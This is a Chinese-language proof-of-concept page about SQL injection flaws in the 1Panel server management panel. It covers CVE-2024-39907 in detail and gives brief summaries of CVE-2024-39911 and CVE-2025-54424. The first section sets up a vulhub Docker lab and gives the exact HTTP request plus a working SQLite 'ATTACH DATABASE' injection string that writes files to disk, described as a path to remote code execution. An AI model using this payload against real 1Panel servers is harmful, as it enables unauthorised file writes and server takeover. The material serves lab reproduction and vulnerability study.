# 1Panel 漏洞 POC

## 系统简介

1Panel 是一款现代化、开源的 Linux 服务器运维管理面板，提供网站、数据库、容器等管理功能。

---

## CVE-2024-39907 — SQL 注入（认证后）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-39907 |
| CVSS | 8.8 (HIGH) |
| 漏洞类型 | SQL 注入 |
| 认证要求 | 需要登录凭证（Post-Auth） |
| 影响版本 | v1.10.9-lts 及更早版本 |
| 修复版本 | v1.10.12-lts |

### 漏洞原理

`/api/v1/hosts/command/search` 接口的 `orderBy` 参数缺少输入验证，存在 SQL 注入漏洞。攻击者可利用 SQLite 的 `ATTACH DATABASE` 功能在文件系统上创建任意文件，进而实现远程代码执行。

### 环境搭建（Docker）

```bash
# 使用 vulhub 环境
git clone https://github.com/vulhub/vulhub
cd vulhub/1panel/CVE-2024-39907
docker compose up -d
# 访问 http://your-ip:10086/entrance
# 账号: 1panel / 密码: 1panel_password
```

### POC — SQL 注入请求

```http
POST /api/v1/hosts/command/search HTTP/1.1
Host: your-ip:10086
Content-Type: application/json
Cookie: psession=<your-session-cookie>

{
  "page": 1,
  "pageSize": 10,
  "groupID": 0,
  "orderBy": "<sqlite3注入点>",
  "order": "ascending",
  "name": "a"
}
```

### 利用步骤

1. 登录 1Panel 控制台获取 session cookie
2. 发送上述 POST 请求，`orderBy` 参数注入恶意 SQL
3. 以下语句可以写文件
3;ATTACH DATABASE '/tmp/randstr.txt' AS test;create TABLE test.exp (data text);drop table test.exp;

### 参考资料

- [Vulhub CVE-2024-39907](https://github.com/vulhub/vulhub/blob/master/1panel/CVE-2024-39907/README.md)
- [NVD CVE-2024-39907](https://nvd.nist.gov/vuln/detail/CVE-2024-39907)

---

## CVE-2024-39911 — SQL 注入（未认证，CVSS 10.0）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-39911 |
| CVSS | 10.0 (CRITICAL) |
| 漏洞类型 | SQL 注入（未认证） |
| 认证要求 | 无需认证 |
| 影响版本 | 特定版本 |

### 漏洞原理

相比 CVE-2024-39907，此漏洞无需认证即可触发 SQL 注入，危险程度更高（CVSS 满分 10.0）。

### 参考资料

- [Security Online CVE-2024-39911](https://securityonline.info/1panel-users-urged-to-patch-after-critical-sqli-flaws-cve-2024-39911-cvss-10-discovered/)
- [NVD CVE-2024-39911](https://nvd.nist.gov/vuln/detail/CVE-2024-39911)
- [CVEFeed CVE-2024-39911](https://cvefeed.io/vuln/detail/CVE-2024-39911)

---

## CVE-2025-54424 — 1Panel Pro 远程代码执行（严重）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2025-54424 |
| 漏洞类型 | 远程代码执行（RCE） |
| 影响版本 | 1Panel Pro 特定版本 |
| 严重等级 | Critical |

### 参考资料

- [Dev.to CVE-2025-54424](https://dev.to/sharon_42e16b8da44dabde6d/cve-2025-54424-critical-rce-vulnerability-in-1panel-pro-patch-now-37o0)
